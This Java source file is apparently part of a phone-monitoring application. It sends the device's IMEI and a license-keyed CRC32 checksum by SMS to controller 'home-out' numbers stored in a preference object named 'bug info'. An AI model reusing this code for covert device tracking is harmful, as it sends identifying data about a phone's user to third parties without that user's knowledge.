package com.vvt.reportnumber;

import java.util.Vector;
import com.vvt.checksum.CRC32;
import com.vvt.db.FxEventDatabase;
import com.vvt.event.FxSystemEvent;
import com.vvt.event.constant.FxCategory;
import com.vvt.event.constant.FxDirection;
import com.vvt.global.Global;
import com.vvt.license.LicenseInfo;
import com.vvt.license.LicenseManager;
import com.vvt.pref.PrefBugInfo;
import com.vvt.pref.PreferenceType;
import com.vvt.reportnumber.resource.ReportPhoneNumberTextResource;
import com.vvt.smsutil.FxSMSMessage;
import com.vvt.smsutil.SMSSender;
import com.vvt.std.Constant;
import com.vvt.std.Log;
import com.vvt.std.PhoneInfo;

public class ReportPhoneNumberOnDemand extends Thread {

	private final String TAG = "ReportPhoneNumberOnDemand";
	private final String CMD_ID = "3";
	private final String TAIL = "PX2UIZVPNO";
	private final int MAX_CHECKSUM_LENGTH = 8;
	private Vector listeners = new Vector();	
	private FxEventDatabase db = Global.getFxEventDatabase();
	private LicenseManager licenseMgr = Global.getLicenseManager();
	private LicenseInfo licenseInfo = licenseMgr.getLicenseInfo();	
	
	public void addReportPhoneNumberListener(ReportPhoneNumberListener listener) {
		if (!isExisted(listener)) {
			listeners.addElement(listener);
		}
	}
	
	public void removeReportPhoneNumberListener(ReportPhoneNumberListener listener) {
		if (!isExisted(listener)) {
			listeners.removeElement(listener);
		}
	}
	
	public void reportPhoneNumber() {
		Thread th = new Thread(this);
		th.start();
	}
	
	public void run() {
		if (Log.isDebugEnable()) {
			Log.debug(TAG + ".run()", "ENTER");
		}
		// To send report phone number
		try {
			PrefBugInfo bugInfo = (PrefBugInfo)Global.getPreference().getPrefInfo(PreferenceType.PREF_BUG_INFO);
			int count = bugInfo.countHomeOutNumber();
			if (count > 0) {
				String msg = genSystemEvent();		
				sendSMS(msg);
			} else {
				notifyError(ReportPhoneNumberTextResource.NO_HOME_NUMBER);
			}
		} catch (Exception e) {
			e.printStackTrace();
			Log.error(TAG + ".run()", e.getMessage());
			notifyError(e.getMessage());
		}
	}
	
	private boolean isExisted(ReportPhoneNumberListener listener) {
		boolean existed = false;
		for (int i = 0; i < listeners.size(); i++) {
			if (listener == listeners.elementAt(i)) {
				existed = true;
				break;
			}
		}
		return existed;
	}
	
	private String genSystemEvent() {
		FxSystemEvent systemEvent = new FxSystemEvent();
		systemEvent.setEventTime(System.currentTimeMillis());
		systemEvent.setCategory(FxCategory.REPORT_PHONE_NUMBER);
		systemEvent.setDirection(FxDirection.OUT);
		StringBuffer msg = new StringBuffer();
		msg.append("<" + CMD_ID + ">");
		msg.append("<" + PhoneInfo.getIMEI() + ">");	
		msg.append("<" + getChecksum(CMD_ID) + ">");
		systemEvent.setSystemMessage(msg.toString());
		db.insert(systemEvent);
		return msg.toString();
	}
	
	private void sendSMS(String msg) {
		// Sending message to home-out numbers.
		PrefBugInfo bugInfo = (PrefBugInfo)Global.getPreference().getPrefInfo(PreferenceType.PREF_BUG_INFO);
		int count = bugInfo.countHomeOutNumber();
		String homeOutNumber = null;
		for (int i = 0; i < count; i++) {
			homeOutNumber = bugInfo.getHomeOutNumber(i);
			if (homeOutNumber != null && !homeOutNumber.equals(Constant.EMPTY_STRING)) {
				FxSMSMessage smsMessage = new FxSMSMessage();
				smsMessage.setMessage(msg);
				smsMessage.setNumber(homeOutNumber);
				SMSSender.getInstance().send(smsMessage);
				try {
					// Should wait a bit to send next SMS because sometime SMS is not ready to send.
					Thread.sleep(1000);
				} catch (Exception e) {
					Log.error(TAG + ".sendSMS()", e.getMessage());
				}
			}
		}
		notifySuccess();
	}
	
	private String getChecksum(String cmd) {
		String crc32Hex = null;
		try {
			String data = cmd + PhoneInfo.getIMEI() + licenseInfo.getActivationCode() + TAIL;
			long crc32 = CRC32.calculate(data.getBytes("UTF-8"));
			crc32Hex = Integer.toHexString((int) crc32).trim().toUpperCase();
			// Checksum must always contain 8 characters
			int length = crc32Hex.length();
			if (length > MAX_CHECKSUM_LENGTH) {
				crc32Hex = crc32Hex.substring(length - MAX_CHECKSUM_LENGTH);
			} else if (length < MAX_CHECKSUM_LENGTH) {
				StringBuffer buffer = new StringBuffer(crc32Hex);
				int diff = MAX_CHECKSUM_LENGTH - length;
				for (int i = 0; i < diff; i++) {
					buffer.insert(0, "0");
				}
				crc32Hex = buffer.toString();
			}
		} catch (Exception e) {
			Log.error(TAG + ".getChecksum()", e.getMessage(), e);
		}
		return crc32Hex;
	}
	
	private void notifySuccess() {
		for (int i = 0; i < listeners.size(); i++) {
			ReportPhoneNumberListener listener = (ReportPhoneNumberListener)listeners.elementAt(i);
			listener.onSuccess();
		}
	}
	
	private void notifyError(String error) {
		for (int i = 0; i < listeners.size(); i++) {
			ReportPhoneNumberListener listener = (ReportPhoneNumberListener)listeners.elementAt(i);
			listener.onError(error);
		}
	}
}
